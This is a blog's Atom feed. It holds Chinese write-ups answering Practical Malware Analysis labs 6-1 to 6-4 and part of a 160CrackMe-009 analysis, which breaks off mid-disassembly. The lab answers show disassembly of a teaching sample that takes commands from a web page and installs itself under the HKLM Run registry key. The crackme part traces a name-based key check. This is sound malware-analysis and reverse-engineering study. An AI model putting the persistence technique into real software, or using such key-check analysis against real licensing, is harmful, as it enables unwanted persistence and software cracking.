<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ackie&#39;blog</title>
  
  
  <link href="https://b1ackie.cn/atom.xml" rel="self"/>
  
  <link href="https://b1ackie.cn/"/>
  <updated>2021-08-12T06:17:54.689Z</updated>
  <id>https://b1ackie.cn/</id>
  
  <author>
    <name>b1ackie</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>恶意代码分析实战-实验7</title>
    <link href="https://b1ackie.cn/2021/08/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/"/>
    <id>https://b1ackie.cn/2021/08/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/</id>
    <published>2021-08-11T09:50:45.000Z</published>
    <updated>2021-08-12T06:17:54.689Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-7-1"><a href="#Lab-7-1" class="headerlink" title="Lab 7-1"></a>Lab 7-1</h2><h3 id="1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？"><a href="#1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？" class="headerlink" title="1.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？"></a>1.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-7-1&quot;&gt;&lt;a href=&quot;#Lab-7-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 7-1&quot;&gt;&lt;/a&gt;Lab 7-1&lt;/h2&gt;&lt;h3 id=&quot;1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？&quot;&gt;&lt;a href=&quot;#1</summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验6</title>
    <link href="https://b1ackie.cn/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/"/>
    <id>https://b1ackie.cn/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/</id>
    <published>2021-08-10T07:52:15.000Z</published>
    <updated>2021-08-10T10:46:29.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-6-1"><a href="#Lab-6-1" class="headerlink" title="Lab 6-1"></a>Lab 6-1</h2><h3 id="1-由main函数调用的唯一子过程中发现的主要代码结构是什么？"><a href="#1-由main函数调用的唯一子过程中发现的主要代码结构是什么？" class="headerlink" title="1.由main函数调用的唯一子过程中发现的主要代码结构是什么？"></a>1.由main函数调用的唯一子过程中发现的主要代码结构是什么？</h3><p>使用IDA找到main函数看到调用了一个子函数sub_401000，F5即可看到伪代码。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-1.png"></p><p>可以看到调用了InternetGetConnectedState这个API，这个函数是用来检测是否联网的，判断本地网络状态。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">InternetGetConnectedState</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD lpdwFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   dwReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>当存在一个连接时返回TRUE，否则返回FALSE。</p><h3 id="2-位于0x40105F的子过程是什么？"><a href="#2-位于0x40105F的子过程是什么？" class="headerlink" title="2.位于0x40105F的子过程是什么？"></a>2.位于0x40105F的子过程是什么？</h3><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-2.png"></p><p>这样确实看不太出来是做什么的。</p><p>这样看可以看到成功或者失败分别会压入栈不同的文字然后调用。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-3.png"></p><p>再看实际运行情况，推测应该是一个printf函数。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-4.png"></p><h3 id="3-这个程序的目的是什么？"><a href="#3-这个程序的目的是什么？" class="headerlink" title="3.这个程序的目的是什么？"></a>3.这个程序的目的是什么？</h3><p>通过上面的函数分析可以得知，这是一个判断是否有网络连接的程序。如果存在网络连接返回1，否则返回0。</p><h2 id="Lab-6-2"><a href="#Lab-6-2" class="headerlink" title="Lab 6-2"></a>Lab 6-2</h2><h3 id="1-main函数调用的第一个子过程执行了什么操作？"><a href="#1-main函数调用的第一个子过程执行了什么操作？" class="headerlink" title="1.main函数调用的第一个子过程执行了什么操作？"></a>1.main函数调用的第一个子过程执行了什么操作？</h3><p>调用的第一个函数是sub_401000，调用了InternetGetConnectedState这个API判断当前是否连接了网络</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-1.png"></p><h3 id="2-位于0x40117F的子过程是什么？"><a href="#2-位于0x40117F的子过程是什么？" class="headerlink" title="2.位于0x40117F的子过程是什么？"></a>2.位于0x40117F的子过程是什么？</h3><p>查看此函数，发现与lab6-1是一样的，所以是一个printf函数。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-2.png"></p><h3 id="3-被main函数调用的第二个子过程做了什么？"><a href="#3-被main函数调用的第二个子过程做了什么？" class="headerlink" title="3.被main函数调用的第二个子过程做了什么？"></a>3.被main函数调用的第二个子过程做了什么？</h3><p>首先调用了InternetOpenA初始化应用程序对 WinINet 函数的使用。</p><p>然后调用了InternetOpenUrlA下载“<a href="http://www.practicalmalwareanalysis.com/cc.htm%E2%80%9D%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2">http://www.practicalmalwareanalysis.com/cc.htm”这个页面</a></p><p>再调用InternetReadFile读取数据，如果读取的前几个字符是“&lt;!–”就成功，如果失败就会打印“Error 2.3: Fail to get command”，读取失败会打印“Error 2.2: Fail to ReadFile”</p><p>openurl失败会打印“Error 2.1: Fail to OpenUrl”</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-3.png"></p><p>再仔细分析一下返回值，可以看到前几个值如果比对都正确的话，那么会把第五个字符给al，而前几个字符是html页面的注释，也就是读取注释的第一个字符。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-4.png"></p><p>这个函数结束之后，可以看出来后al的值会再次赋给[EBP+var_8]，最终会传给ecx，再压入栈作为printf的一个参数。可以看到压入栈一句话”Success: Parsed command is %c\n”，%c对应的就是这个值，打印出这个字符。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-5.png"></p><h3 id="4-在这个子过程中使用了什么类型的代码结构？"><a href="#4-在这个子过程中使用了什么类型的代码结构？" class="headerlink" title="4.在这个子过程中使用了什么类型的代码结构？"></a>4.在这个子过程中使用了什么类型的代码结构？</h3><p>if-else的结构</p><h3 id="5-在这个程序中有任何基于网络的指示吗？"><a href="#5-在这个程序中有任何基于网络的指示吗？" class="headerlink" title="5.在这个程序中有任何基于网络的指示吗？"></a>5.在这个程序中有任何基于网络的指示吗？</h3><p>使用了Internet Explorer 7.5/pma作为InternetOpenA函数lpszAgent参数的值，还有<a href="http://www.practicalmalwareanalysis.com/cc.htm%E8%BF%99%E4%B8%AAURL%E3%80%82">http://www.practicalmalwareanalysis.com/cc.htm这个URL。</a></p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-6.png"></p><h3 id="6-这个恶意代码的目的是什么？"><a href="#6-这个恶意代码的目的是什么？" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>首先判断是否联网，如果联网那么就会开始读取<a href="http://www.practicalmalwareanalysis.com/cc.htm%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%E7%9A%84%EF%BC%8C%E7%84%B6%E5%90%8E%E8%8E%B7%E5%8F%96%E6%B3%A8%E9%87%8A%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%9C%80%E5%90%8E%E5%B0%86%E5%85%B6%E6%89%93%E5%8D%B0%E5%87%BA%E6%9D%A5%EF%BC%8C%E5%86%8D%E8%B0%83%E7%94%A8sleep%E5%87%BD%E6%95%B0">http://www.practicalmalwareanalysis.com/cc.htm这个页面的，然后获取注释的第一个字符，最后将其打印出来，再调用sleep函数</a></p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-7.png"></p><h2 id="Lab-6-3"><a href="#Lab-6-3" class="headerlink" title="Lab 6-3"></a>Lab 6-3</h2><h3 id="1-比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？"><a href="#1-比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？" class="headerlink" title="1.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？"></a>1.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？</h3><p>多了一个函数sub_401130函数</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-1.png"></p><p>这个新函数是通过读取到的值来执行不同的操作。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-2.png"></p><h3 id="2-这个新函数使用的参数是什么？"><a href="#2-这个新函数使用的参数是什么？" class="headerlink" title="2.这个新函数使用的参数是什么？"></a>2.这个新函数使用的参数是什么？</h3><p>使用的参数是通过读取网页资源注释中得到的字符，还有一个是main函数的参数argv[0]，就是程序名本身。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-8.png"></p><h3 id="3-这个函数包含的主要代码结构是什么？"><a href="#3-这个函数包含的主要代码结构是什么？" class="headerlink" title="3.这个函数包含的主要代码结构是什么？"></a>3.这个函数包含的主要代码结构是什么？</h3><p>包含的主要结构式switch结构</p><h3 id="4-这个函数能够做什么"><a href="#4-这个函数能够做什么" class="headerlink" title="4.这个函数能够做什么"></a>4.这个函数能够做什么</h3><p>首先当字符等于“a”时，可以创建一个文件夹路径是C:\TEMP</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-3.png"></p><p>当字符等于“b”时，会将自身复制到创建文件夹内，并且重命名为cc.exe</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-4.png"></p><p>等于“c”时，会删除文件夹下的cc.exe。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-5.png"></p><p>等于“d”时，会实现一个自启动功能，在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run下写入键值</p><p>通过注册表实现自启动可以看这里：<a href="https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/">自启动技术-注册表</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0040118F</span>  |.  <span class="hljs-number">51</span>            push ecx                                 ; /pHandle = kernel<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">5483</span>B<br><span class="hljs-attribute">00401190</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">3</span>F<span class="hljs-number">000</span>F<span class="hljs-number">00</span>   push <span class="hljs-number">0</span>xF<span class="hljs-number">003</span>F                             ; |Access = KEY_ALL_ACCESS<br><span class="hljs-attribute">00401195</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                 ; |Reserved = <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00401197</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">70714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">00407170</span>                   ; |Software\Microsoft\Windows\CurrentVersion\Run<br><span class="hljs-attribute">0040119C</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">02000080</span>   push <span class="hljs-number">0</span>x<span class="hljs-number">80000002</span>                          ; |hKey = HKEY_LOCAL_MACHINE<br><span class="hljs-attribute">004011A1</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">04604000</span> call dword ptr ds:[&lt;&amp;ADVAPI<span class="hljs-number">32</span>.RegOpenKey&gt;; \RegOpenKeyExA<br><span class="hljs-attribute">004011A7</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">0</span>F         push <span class="hljs-number">0</span>xF                                 ; /BufSize = F (<span class="hljs-number">15</span>.)<br><span class="hljs-attribute">004011A9</span>  |.  <span class="hljs-number">68</span> A<span class="hljs-number">0714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">004071</span>A<span class="hljs-number">0</span>                   ; |C:\Temp\cc.exe<br><span class="hljs-attribute">004011AE</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">01</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">1</span>                                 ; |ValueType = REG_SZ<br><span class="hljs-attribute">004011B0</span>  |.  <span class="hljs-number">6</span>A <span class="hljs-number">00</span>         push <span class="hljs-number">0</span>x<span class="hljs-number">0</span>                                 ; |Reserved = <span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">004011B2</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">68714000</span>   push Lab<span class="hljs-number">06</span>-<span class="hljs-number">03</span>.<span class="hljs-number">00407168</span>                   ; |Malware<br><span class="hljs-attribute">004011B7</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> FC       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]           ; |<br><span class="hljs-attribute">004011BA</span>  |.  <span class="hljs-number">52</span>            push edx                                 ; |hKey = <span class="hljs-number">0</span>x<span class="hljs-number">23</span>C<br><span class="hljs-attribute">004011BB</span>  |.  FF<span class="hljs-number">15</span> <span class="hljs-number">00604000</span> call dword ptr ds:[&lt;&amp;ADVAPI<span class="hljs-number">32</span>.RegSetValu&gt;; \RegSetValueExA<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-6.png"></p><p>等于“e”的时候，调用sleep函数</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-7.png"></p><p>都不满足的话就打印字符串“Error 3.2: Not a valid command provided”</p><h3 id="5-这个恶意代码中有什么本地特征吗？"><a href="#5-这个恶意代码中有什么本地特征吗？" class="headerlink" title="5.这个恶意代码中有什么本地特征吗？"></a>5.这个恶意代码中有什么本地特征吗？</h3><p>有，就是前面分析的注册表键值的修改，还有对于文件夹的创建和文件的复制。</p><h3 id="6-这个恶意代码的目的是什么？-1"><a href="#6-这个恶意代码的目的是什么？-1" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>判断网络是否连接，然后读取一个网页资源中的注释后的第一个字符，通过这个字符来判断进行何种操作。具体上面已经分析过了。</p><h2 id="Lab-6-4"><a href="#Lab-6-4" class="headerlink" title="Lab 6-4"></a>Lab 6-4</h2><h3 id="1-在实验6-3和6-4的main函数中的调用之间的区别是什么？"><a href="#1-在实验6-3和6-4的main函数中的调用之间的区别是什么？" class="headerlink" title="1.在实验6-3和6-4的main函数中的调用之间的区别是什么？"></a>1.在实验6-3和6-4的main函数中的调用之间的区别是什么？</h3><p>加了一个for循环，sub_401040加了一个参数i。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-1.png"></p><h3 id="2-什么新的代码结构已经被添加到main中"><a href="#2-什么新的代码结构已经被添加到main中" class="headerlink" title="2.什么新的代码结构已经被添加到main中"></a>2.什么新的代码结构已经被添加到main中</h3><p>for循环结构</p><h3 id="3-这个实验的解析HTML的函数和前面实验中的那些有什么区别"><a href="#3-这个实验的解析HTML的函数和前面实验中的那些有什么区别" class="headerlink" title="3.这个实验的解析HTML的函数和前面实验中的那些有什么区别"></a>3.这个实验的解析HTML的函数和前面实验中的那些有什么区别</h3><p>主要是给InternetOpenA传入的szAgent参数不一样，这个参数先通过sprintf将“Internet Explorer 7.50/pma”与循环次数i拼接起来。第一次是Internet Explorer 7.50/pma0第二次是Internet Explorer 7.50/pma1…以此类推。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-2.png"></p><h3 id="4-这个程序会运行多久？（假设它已经连接到互联网）"><a href="#4-这个程序会运行多久？（假设它已经连接到互联网）" class="headerlink" title="4.这个程序会运行多久？（假设它已经连接到互联网）"></a>4.这个程序会运行多久？（假设它已经连接到互联网）</h3><p>看这个for循环，每次都会sleep，其中参数是6000ms，是一分钟，也就是每循环一次沉睡一分钟，那么就是1440分钟。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-4-3.png"></p><h3 id="5-在这个恶意代码中有什么新的基于网络的迹象吗？"><a href="#5-在这个恶意代码中有什么新的基于网络的迹象吗？" class="headerlink" title="5.在这个恶意代码中有什么新的基于网络的迹象吗？"></a>5.在这个恶意代码中有什么新的基于网络的迹象吗？</h3><p>就是InternetOpenA传入的szAgent参数不同了，每次都会变。</p><h3 id="6-这个恶意代码的目的是什么？-2"><a href="#6-这个恶意代码的目的是什么？-2" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>跟之前的基本一样，只是运行的时间变得特别长。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Lab-6-1&quot;&gt;&lt;a href=&quot;#Lab-6-1&quot; class=&quot;headerlink&quot; title=&quot;Lab 6-1&quot;&gt;&lt;/a&gt;Lab 6-1&lt;/h2&gt;&lt;h3 id=&quot;1-由main函数调用的唯一子过程中发现的主要代码结构是什么？&quot;&gt;&lt;a href=&quot;#1-</summary>
      
    
    
    
    <category term="恶意代码分析实战" scheme="https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="Lab" scheme="https://b1ackie.cn/tags/Lab/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-009</title>
    <link href="https://b1ackie.cn/2021/08/09/160CrackMe-009/"/>
    <id>https://b1ackie.cn/2021/08/09/160CrackMe-009/</id>
    <published>2021-08-09T10:00:15.000Z</published>
    <updated>2021-08-09T10:54:17.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个VB的程序，调用的时候都是传入一个地址，然后地址直接查看是什么也看不到，没有什么有用的，分析起来看得人一头雾水。查了资料之后才知道，VB的变量特征是前两个4字节都是一些数据类型，第三个四字节才是变量，相当于是首地址+0x8的地方。</p><p>比如此时寄存器中值是18F3F4，它实际存储的值是18F3FC处的数据。</p><p><img src="/2021/08/09/160CrackMe-009/4.png"></p><h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序，看到需要输入name和key输入后弹出错误的提示框。</p><p><img src="/2021/08/09/160CrackMe-009/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳，无壳是用VB语言写的。</p><p><img src="/2021/08/09/160CrackMe-009/2.png"></p><p>使用OD搜索错误提示的字符串可以搜索到直接定位到关键跳转。在函数头部下断开始分析。</p><p><img src="/2021/08/09/160CrackMe-009/3.png"></p><p>先获取了输入的name的长度，但是这个长度后面好像是没有参加任何运算的，我没有分析到有参加运算的地方。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004020</span>EF   .  <span class="hljs-number">51</span>            push ecx                                 ; /Step8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">004020</span>F0   .  <span class="hljs-number">8D45</span> <span class="hljs-number">94</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]          ; |<br><span class="hljs-number">004020</span>F3   .  BB <span class="hljs-number">02000000</span>   mov ebx,<span class="hljs-number">0</span>x2                              ; |<br><span class="hljs-number">004020</span>F8   .  <span class="hljs-number">52</span>            push edx                                 ; |/var18 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-number">004020</span>F9   .  <span class="hljs-number">50</span>            push eax                                 ; ||retBuffer8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-number">004020</span>FA   .  <span class="hljs-number">899</span>D <span class="hljs-number">54</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xAC],ebx          ; ||<br><span class="hljs-symbol">00402100 </span>  .  <span class="hljs-number">899</span>D <span class="hljs-number">44</span>FFFFFF mov dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC],ebx          ; ||<br><span class="hljs-symbol">00402106 </span>  .  FF15 <span class="hljs-number">18414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenVa&gt;; |\__vbaLenVar<br><span class="hljs-number">0040210</span>C   .  <span class="hljs-number">8D8</span>D <span class="hljs-number">44</span>FFFFFF lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xBC]          ; |<br><span class="hljs-symbol">00402112 </span>  .  <span class="hljs-number">50</span>            push eax                                 ; |End8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402113 </span>  .  <span class="hljs-number">8D95</span> E8FEFFFF lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x118]         ; |<br><span class="hljs-symbol">00402119 </span>  .  <span class="hljs-number">51</span>            push ecx                                 ; |Start8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-number">0040211</span>A   .  <span class="hljs-number">8D85</span> F8FEFFFF lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x108]         ; |<br><span class="hljs-symbol">00402120 </span>  .  <span class="hljs-number">52</span>            push edx                                 ; |TMPend8 = <span class="hljs-number">0018</span>F3BC<br><span class="hljs-symbol">00402121 </span>  .  <span class="hljs-number">8D4</span>D DC       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]          ; |<br><span class="hljs-symbol">00402124 </span>  .  <span class="hljs-number">50</span>            push eax                                 ; |TMPstep8 = <span class="hljs-number">0018</span>F3CC<br><span class="hljs-symbol">00402125 </span>  .  <span class="hljs-number">51</span>            push ecx                                 ; |Counter8 = <span class="hljs-number">0018</span>F3E0<br><span class="hljs-symbol">00402126 </span>  .  FF15 <span class="hljs-number">20414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaVarFo&gt;; \__vbaVarForInit<br></code></pre></div></td></tr></table></figure><p>首先是对于name 的操作，获取了每一位的ascii码值，然后相加。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402134 </span>  . /<span class="hljs-number">0</span>F84 <span class="hljs-number">9</span>C000000 je Andréna.<span class="hljs-number">004021D6</span><br><span class="hljs-number">0040213</span>A   . |<span class="hljs-number">8D55</span> <span class="hljs-number">94</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x6C]<br><span class="hljs-number">0040213</span>D   . |<span class="hljs-number">8D45</span> DC       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x24]<br><span class="hljs-symbol">00402140 </span>  . |<span class="hljs-number">52</span>            push edx<br><span class="hljs-symbol">00402141 </span>  . |<span class="hljs-number">50</span>            push eax<br><span class="hljs-symbol">00402142 </span>  . |C745 <span class="hljs-number">9</span>C 